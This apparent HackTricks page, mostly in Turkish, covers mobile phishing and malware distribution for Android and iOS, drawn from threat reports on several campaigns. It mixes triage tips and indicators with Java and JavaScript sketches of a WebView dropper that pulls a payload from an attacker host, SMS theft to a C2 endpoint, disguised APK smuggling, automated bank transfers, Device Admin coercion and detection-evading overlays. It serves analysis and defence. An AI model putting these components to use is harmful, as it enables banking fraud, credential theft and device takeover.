# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa, tehdit aktörlerinin **zararlı Android APK'leri** ve **iOS mobile-configuration profilleri**ni phishing (SEO, social engineering, fake stores, dating apps, vb.) yoluyla dağıtmak için kullandığı teknikleri kapsar.
> İçerik, Zimperium zLabs tarafından açığa çıkarılan SarangTrap kampanyasından (2025) ve diğer 공개 araştırmalardan uyarlanmıştır.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Çok sayıda benzer görünen domain kaydı yapın (dating, cloud share, car service…).
– Google'da sıralama almak için `<title>` öğesinde yerel dil anahtar kelimeleri ve emoji kullanın.
– Aynı landing page üzerinde hem Android (`.apk`) hem de iOS kurulum talimatlarını barındırın.
2. **First Stage Download**
* Android: imzasız ya da “third-party store” bir APK'ye doğrudan bağlantı.
* iOS: `itms-services://` veya aşağıda anlatılan zararlı bir **mobileconfig** profiline düz HTTPS bağlantısı.
3. **Post-install Social Engineering**
* İlk çalıştırmada uygulama bir **invitation / verification code** ister (exclusive access illüzyonu).
* Kod, **HTTP üzerinden POST** ile Command-and-Control (C2)'ye gönderilir.
* C2 `{"success":true}` ile yanıt verir ➜ malware devam eder.
* Geçerli bir kod göndermeyen sandbox / AV dinamik analizi **kötü amaçlı davranış göstermez** (evasion).
4. **Runtime Permission Abuse** (Android)
* Tehlikeli izinler yalnızca **olumlu C2 yanıtından sonra** istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Son sürümler, `AndroidManifest.xml` içinden SMS için olan `<uses-permission>` satırını **kaldırır** ama yine de reflection ile SMS okuyan Java/Kotlin kod yolunu bırakır ⇒ cihazda `AppOps` kötüye kullanımı veya eski hedefler üzerinden izin verilirse hâlâ çalışırken statik skoru düşürür.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13, sideloaded uygulamalar için **Restricted settings** getirdi: Accessibility ve Notification Listener anahtarları, kullanıcı **App info** içinde restricted settings'i açıkça izin verene kadar gri olur.
* Phishing sayfaları ve droper'lar artık sideloaded uygulama için **allow restricted settings** adımlarını tek tek anlatan UI talimatlarıyla gelir ve ardından Accessibility/Notification access'i etkinleştirir.
* Daha yeni bir bypass, payload'ı **session-based PackageInstaller flow** ile yüklemektir (app store'ların kullandığı yöntem). Android uygulamayı store-installed olarak gördüğü için Restricted settings artık Accessibility'yi engellemez.
* Triyaj ipucu: bir dropper içinde `PackageInstaller.createSession/openSession` ile birlikte kurbanı hemen `ACTION_ACCESSIBILITY_SETTINGS` veya `ACTION_NOTIFICATION_LISTENER_SETTINGS` ekranına yönlendiren kodu grep ile arayın.

6. **Facade UI & Background Collection**
* Uygulama yerel olarak uygulanmış zararsız görünümlü ekranlar gösterir (SMS viewer, gallery picker).
* Bu sırada şunları exfiltrate eder:
- IMEI / IMSI, phone number
- Tam `ContactsContract` dump'ı (JSON array)
- [Luban](https://github.com/Curzibn/Luban) ile boyutu küçültmek için `/sdcard/DCIM` içindeki JPEG/PNG'ler sıkıştırılır
- İsteğe bağlı SMS içeriği (`content://sms`)
Payload'lar **batch-zipped** edilir ve `HTTP POST /upload.php` ile gönderilir.
7. **iOS Delivery Technique**
* Tek bir **mobile-configuration profile**, cihazı “MDM”-benzeri supervision'a kaydettirmek için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.
* Social-engineering talimatları:
1. Settings ➜ *Profile downloaded* açın.
2. *Install* düğmesine üç kez dokunun (phishing sayfasındaki ekran görüntüleri).
3. İmzasız profile trust verin ➜ saldırgan App Store incelemesi olmadan *Contacts* ve *Photo* entitlement kazanır.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload'ları, marka ikon/etiketiyle bir phishing URL'sini Home Screen'e **sabitleyebilir**.
* Web Clips **full-screen** çalışabilir (browser UI'sini gizler) ve **non-removable** olarak işaretlenebilir; bu da ikonun kaldırılması için kurbanı profili silmeye zorlar.
9. **Network Layer**
* Düz HTTP, çoğunlukla 80 portunda ve `api.<phishingdomain>.com` gibi bir HOST header ile.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → tespiti kolay).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Malware değerlendirmesi sırasında, kötü amaçlı dala ulaşmak için invitation code aşamasını Frida/Objection ile otomatikleştirin.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` ile runtime `PackageManager#getRequestedPermissions()` karşılaştırın; eksik dangerous perms kırmızı bayraktır.
* **Network Canary** – Kod girişinden sonra gelen anormal POST patlamalarını tespit etmek için `iptables -p tcp --dport 80 -j NFQUEUE` yapılandırın.
* **mobileconfig Inspection** – `security cms -D -i profile.mobileconfig` komutunu macOS'te kullanarak `PayloadContent` listesini çıkarın ve aşırı entitlement'ları tespit edin.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Göstergeler (Genel)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Bu kalıp, Hint UPI kimlik bilgilerini ve OTP’leri çalmak için devlet-yardımı temalarını suistimal eden kampanyalarda gözlemlenmiştir. Operatörler teslimat ve dayanıklılık için güvenilir platformları zincir halinde kullanır.

### Güvenilir platformlar arasında teslimat zinciri
- YouTube video lure → açıklama kısa bir link içerir
- Shortlink → meşru portalı taklit eden GitHub Pages phishing site
- Aynı GitHub repo, doğrudan dosyaya bağlanan sahte bir “Google Play” rozeti taşıyan APK barındırır
- Dinamik phishing sayfaları Replit üzerinde çalışır; uzak komut kanalı Firebase Cloud Messaging (FCM) kullanır

### Gömülü payload ve offline kurulumlu dropper
- İlk APK bir installer (dropper) olur; gerçek malware’i `assets/app.apk` içinde taşır ve cloud detection’ı zayıflatmak için kullanıcıdan Wi‑Fi/mobile data’yı devre dışı bırakmasını ister.
- Gömülü payload, masum bir etiket altında (ör. “Secure Update”) kurulur. Kurulumdan sonra hem installer hem de payload ayrı uygulamalar olarak bulunur.

Static triage ipucu (gömülü payload’lar için grep):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Kısa bağlantı üzerinden dinamik endpoint keşfi
- Malware, bir shortlink üzerinden düz metin, virgülle ayrılmış canlı endpoint listesini alır; basit string dönüşümleri son phishing page yolunu üretir.

Örnek (sanitized):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” adımı, dynamic endpoint içindeki bir attacker HTML formunu bir WebView içinde yükler ve hassas alanları (phone, bank, UPI PIN) yakalar; bunlar `addup.php` adresine `POST` edilir.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Kendini yayma ve SMS/OTP yakalama
- İlk çalıştırmada agresif izinler istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kişiler, kurbanın cihazından toplu smishing SMS göndermek için döngüye alınır.
- Gelen SMS'ler bir broadcast receiver tarafından yakalanır ve metadata (gönderen, içerik, SIM slotu, cihaza özel rastgele ID) ile birlikte `/addsm.php` adresine yüklenir.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Payload, FCM'ye kaydolur; push mesajları, eylemleri tetiklemek için bir switch olarak kullanılan bir `_type` alanı taşır (örn., phishing metin şablonlarını güncellemek, davranışları değiştirmek).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Saldırganlar giderek statik APK bağlantılarını, Google Play benzeri yemlerin içine gömülü bir Socket.IO/WebSocket kanalıyla değiştiriyor. Bu, payload URL’sini gizler, URL/uzantı filtrelerini aşar ve gerçekçi bir kurulum UX’i korur.

Sahada gözlemlenen tipik client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Neden basit kontrolleri atlatır:
- Hiçbir statik APK URL’si açığa çıkmaz; payload, WebSocket frame’lerinden bellekte yeniden oluşturulur.
- Doğrudan .apk yanıtlarını engelleyen URL/MIME/uzantı filtreleri, WebSockets/Socket.IO üzerinden tünellenen binary veriyi kaçırabilir.
- WebSockets çalıştırmayan crawler’lar ve URL sandbox’ları payload’u alamaz.

Ayrıca WebSocket tradecraft ve tooling için:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT kampanyası (ThreatFabric), modern mobile phishing operasyonlarının WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover ve hatta NFC-relay orchestration tekniklerini nasıl birleştirdiğine dair somut bir örnektir. Bu bölüm, yeniden kullanılabilir teknikleri soyutlar.

### Stage-1: WebView → native install bridge (dropper)
Saldırganlar, saldırgan sayfasına işaret eden bir WebView sunar ve native installer’ı açığa çıkaran bir JavaScript interface enjekte eder. Bir HTML düğmesine dokunma, dropper’ın assets klasörüne gömülü ikinci aşama APK’yi yükleyen ve ardından onu doğrudan başlatan native code’a çağrı yapar.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML sayfadaki:
```html
<button onclick="bridge.installApk()">Install</button>
```
Kurulumdan sonra dropper, payload'ı explicit package/activity ile başlatır:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Av fikri: `addJavascriptInterface()` çağıran güvenilmeyen uygulamalar ve WebView’e installer-like method’ları açığa çıkarmaları; `assets/` altında gömülü secondary payload taşıyan ve Package Installer Session API kullanan APK.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2, bir “Access” sayfası barındıran bir WebView açar. Butonu, victim’i Accessibility ayarlarına yönlendiren ve rogue service’in etkinleştirilmesini isteyen export edilmiş bir method’u çağırır. Bir kez izin verildiğinde, malware sonrasındaki runtime permission dialogs (contacts, overlay, manage system settings, etc.) üzerinden otomatik tıklama yapmak için Accessibility kullanır ve Device Admin ister.

- Accessibility, node-tree içinde “Allow”/“OK” gibi butonları bularak ve tıklamaları dispatch ederek sonraki prompts’u programmatically kabul etmeye yardımcı olur.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Ayrıca bakınız:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView üzerinden overlay phishing/ransom
Operatörler şu komutları verebilir:
- bir URL’den tam ekran overlay render etmek veya
- bir WebView overlay içinde yüklenen inline HTML geçirmek.

Muhtemel kullanım alanları: coercion (PIN girişi), PIN’leri yakalamak için wallet açma, ransom mesajları. Overlay izni eksikse verildiğinden emin olmak için bir komut bulundurun.

### Uzaktan kontrol modeli – text pseudo-screen + screen-cast
- Düşük bant genişliği: Accessibility node ağacını periyodik olarak dök, görünür text/rol/sınırları serialize et ve pseudo-screen olarak C2’ye gönder (ör. bir kez `txt_screen` ve sürekli `screen_live` komutları).
- Yüksek sadakat: MediaProjection iste ve talep üzerine screen-casting/recording başlat (ör. `display` / `record` komutları).

### ATS playbook (bank app automation)
Bir JSON görev verildiğinde, bank app’i açın, UI’yi Accessibility üzerinden text sorguları ve koordinat dokunuşlarının karışımıyla yönetin ve istendiğinde kurbanın payment PIN’ini girin.

Örnek görev:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Örnek metinler bir hedef akışında görülenler (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operatörler ayrıca `check_limit` ve `limit` gibi komutlarla transfer limitlerini de kontrol edebilir/artırabilir; bunlar limits UI üzerinden benzer şekilde gezinir.

### Crypto wallet seed extraction
MetaMask, Trust Wallet, Blockchain.com, Phantom gibi hedefler. Akış: unlock (çalınmış PIN veya sağlanan password), Security/Recovery'ye git, seed phrase'i reveal/show et, bunu keylog/exfiltrate et. Diller arasında akışı stabil hale getirmek için locale-aware selectors (EN/RU/CZ/SK) uygula.

### Device Admin coercion
Device Admin APIs, PIN-capture fırsatlarını artırmak ve kurbanı zor durumda bırakmak için kullanılır:

- Immediate lock:
```java
dpm.lockNow();
```
- Mevcut kimlik bilgisinin süresini doldurup değişimi zorla (Accessibility yeni PIN/parola yakalar):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Anahtar kilidi biyometrik özelliklerini devre dışı bırakarak biyometrik olmayan kilit açmayı zorlayın:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Recent Android sürümlerinde birçok DevicePolicyManager kontrolü Device Owner/Profile Owner gerektirir; bazı OEM build’leri daha gevşek olabilir. Hedef OS/OEM üzerinde her zaman doğrulayın.

### NFC relay orchestration (NFSkate)
Stage-3 bir external NFC-relay module’ü (örn. NFSkate) kurup başlatabilir ve hatta relay sırasında victim’a rehberlik etmek için ona bir HTML template verebilir. Bu, online ATS ile birlikte contactless card-present cash-out yapılmasını sağlar.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actor’ler giderek Accessibility-driven automation ile temel davranış biometrics’e karşı ayarlanmış anti-detection tekniklerini birleştiriyor. Yakın tarihli bir banker/RAT, iki tamamlayıcı text-delivery modu ve rastgeleleştirilmiş cadence ile insan yazımını simüle eden bir operator toggle gösteriyor.

- Discovery mode: aksiyon almadan önce girişleri hassas biçimde hedeflemek için görünür node’ları selector’lar ve bounds ile enumerate et (ID, text, contentDescription, hint, bounds).
- Dual text injection:
- Mode 1 – hedef node üzerinde doğrudan `ACTION_SET_TEXT` (stabil, keyboard yok);
- Mode 2 – clipboard set + focus’lu node içine `ACTION_PASTE` (direct setText engellendiğinde çalışır).
- Human-like cadence: operator tarafından verilen string’i böl ve “machine-speed typing” heuristics’inden kaçmak için event’ler arasında rastgele 300–3000 ms gecikmelerle karakter karakter ilet. Bunu ya `ACTION_SET_TEXT` ile değeri kademeli büyüterek ya da her seferinde bir karakter paste ederek uygula.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Dolandırıcılık kapsamı için engelleyici overlay’ler:
- Operatör kontrollü opaklıkla tam ekran bir `TYPE_ACCESSIBILITY_OVERLAY` render edin; uzak otomasyon altta devam ederken bunu kurban için opak tutun.
- Tipik olarak sunulan komutlar: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Ayarlanabilir alpha’ya sahip minimal overlay:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Sıklıkla görülen operator control primitives: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## WebView bridge, JNI string decoder ve staged DEX loading içeren çok aşamalı Android dropper

CERT Polska'nın 03 April 2026 tarihli **cifrat** analizi, görünen APK'nin yalnızca bir installer shell olduğu modern bir phishing-delivered Android loader için iyi bir referanstır. Yeniden kullanılabilir tradecraft, family name değil, stage'lerin nasıl zincirlendiğidir:

1. Phishing page bir lure APK teslim eder.
2. Stage 0, `REQUEST_INSTALL_PACKAGES` ister, native bir `.so` yükler, gömülü bir blob'u decrypt eder ve **PackageInstaller sessions** ile stage 2'yi yükler.
3. Stage 2 başka bir gizli asset'i decrypt eder, onu bir ZIP olarak ele alır ve son RAT için **dynamically loads DEX** yapar.
4. Final stage, Accessibility/MediaProjection'i abuse eder ve control/data için WebSockets kullanır.

### Kurulum denetleyicisi olarak WebView JavaScript bridge

WebView'i yalnızca sahte branding için kullanmak yerine, lure local/remote bir page'in device fingerprint almasına ve native install logic'i tetiklemesine izin veren bir bridge expose edebilir:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage fikirleri:
- `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` ve aynı activity içinde kullanılan remote phishing URLs için `grep` yapın
- installer benzeri metotlar (`start`, `install`, `openAccessibility`, `requestOverlay`) expose eden bridges’i izleyin
- bridge bir phishing page tarafından destekleniyorsa, bunu sadece UI olarak değil, bir operator/controller surface olarak değerlendirin

### `JNI_OnLoad` içinde registered edilen Native string decoding

Faydalı bir pattern, zararsız görünen ama aslında `JNI_OnLoad` sırasında `RegisterNatives` tarafından desteklenen bir Java metodudur. cifrat’ta decoder ilk char’ı yok sayıyordu, ikincisini 1-byte XOR key olarak kullanıyordu, kalan kısmı hex-decode ediyordu ve her byte’ı `((b - i) & 0xff) ^ key` olarak dönüştürüyordu.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Bunu şunları gördüğünüzde kullanın:
- URL'ler, package names veya anahtarlar için yerel-backed tek bir Java methoduna tekrar eden çağrılar
- `JNI_OnLoad` içinde classes çözülmesi ve `RegisterNatives` çağrılması
- DEX içinde anlamlı plaintext strings olmaması, ama bir helper'a geçirilen çok sayıda kısa hex-benzeri constant bulunması

### Katmanlı payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Bu family, genelleştirerek avlanmaya değer iki unpacking layer kullandı:

- **Stage 0**: `res/raw/*.bin` dosyasını native decoder üzerinden türetilen bir XOR key ile decrypt et, ardından plaintext APK'yi `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit` ile install et
- **Stage 2**: `FH.svg` gibi masum görünen bir asset çıkar, bunu RC4-like bir routine ile decrypt et, sonucu ZIP olarak parse et, ardından hidden DEX files yükle

Bu, gerçek bir dropper/loader pipeline için güçlü bir göstergedir; çünkü her layer, bir sonraki stage'i basic static scanning'e karşı opaque tutar.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` ile birlikte `PackageInstaller` session çağrıları
- install sonrası zinciri sürdürmek için `PACKAGE_ADDED` / `PACKAGE_REPLACED` receiver'ları
- `res/raw/` veya `assets/` altında, medya olmayan extension'lara sahip encrypted blob'lar
- custom decryptor'lara yakın `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling

### Native anti-debugging through `/proc/self/maps`

Native bootstrap ayrıca `/proc/self/maps` içinde `libjdwp.so` taradı ve varsa durdu. Bu, pratik bir erken anti-analysis check'tir; çünkü JDWP-backed debugging tanınabilir bir mapped library bırakır:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Fikir avı:
- native code / decompiler çıktısında `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu` için grep yap
- Frida hook'ları çok geç gelirse, önce `.init_array` ve `JNI_OnLoad`'u incele
- anti-debug + string decoder + staged install'u bağımsız bulgular olarak değil, tek bir küme olarak ele al

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
